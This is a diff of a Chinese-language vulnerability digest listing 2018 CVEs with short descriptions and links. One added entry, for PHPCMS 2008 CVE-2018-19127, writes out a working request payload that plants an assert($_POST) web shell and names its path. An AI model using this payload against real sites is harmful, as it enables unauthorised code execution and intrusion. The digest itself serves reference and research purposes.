@@ -9,6 +9,10 @@ share: true
 
 2018
 ---
+1. **【20181128】PHPCMS 2008 任意文件写入 RCE CVE-2018-19127**
+    - 描述：发恶意包：`/type.php?template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss`Shell落在这个文件：`/cache_template/rss.tpl.php` 内容：`"@unlink(FILE);assert($_POST[1]);"`
+    - <http://www.yncert.org.cn/article/show/8119.html>
+    - <https://github.com/ab1gale/phpcms-2008-CVE-2018-19127>
 
 1. **【20181106】GOGS/Gitea任意代码执行(CVE-2018-18925/6)及利用流程**
     - 漏洞分析：<https://xz.aliyun.com/t/3168> <https://www.anquanke.com/post/id/163575>
@@ -100,6 +104,7 @@ https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0
 1. **【20180817】在野利用的 VBScript 引擎 UAF 漏洞 CVE-2018-8373**
     - https://blog.trendmicro.com/trendlabs-security-intelligence/use-after-free-uaf-vulnerability-cve-2018-8373-in-vbscript-engine-affects
     -internet-explorer-to-run-shellcode/
+    - <https://www.freebuf.com/column/190504.html>
     - 利用CVE-2018-8373 0day漏洞的攻击与Darkhotel团伙相关的分析 <https://ti.360.net/blog/articles/analyzing-attack-of-cve-2018-8373-and-darkhotel/>
 
 1. **【20180815】OpenSSH用户枚举漏洞CVE-2018-15473**
@@ -206,6 +211,9 @@ https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0
     - 影响：Microsoft Windows Server 2008 Microsoft Windows Server 2008 R2 Microsoft Windows 7 Microsoft Windows Windows Server 2012 Microsoft Windows 8.1 Microsoft Windows Server 2012 R2 Microsoft Windows RT 8.1 Microsoft Windows 10 Microsoft Windows Server 2016 
     - 分析文章：https://codewhitesec.blogspot.com/2018/06/cve-2018-0624.html 
     
+1. **【20180508】Windows VBScript引擎远程执行代码漏洞 CVE-2018-8174**
+    - 描述：VBScript引擎处理内存中对象的方式中存在一个远程执行代码漏洞。该漏洞可能以一种攻击者可以在当前用户的上下文中执行任意代码的方式来破坏内存。成功利用此漏洞的攻击者可以获得与当前用户相同的用户权限。
+    - <https://www.freebuf.com/column/188622.html>
 
 1. **【20180502】7-Zip命令执行漏洞（CVE-2018-10115）**
     - 分析：<https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/>
